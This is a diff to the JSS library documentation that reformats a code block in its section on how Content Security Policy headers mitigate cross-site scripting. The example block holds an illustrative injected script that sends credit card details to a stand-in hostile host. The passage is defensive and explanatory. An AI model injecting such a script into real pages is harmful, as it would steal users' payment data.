@@ -416,10 +416,11 @@ JSS uses feature detection to apply the correct prefixes. [Don't be surprised](h
 
 Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
 
-    <script>
-      sendCreditCardDetails('https://hostile.example');
-    </script>
-    
+```html
+<script>
+  sendCreditCardDetails('https://hostile.example');
+</script>
+```
 
 This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
 
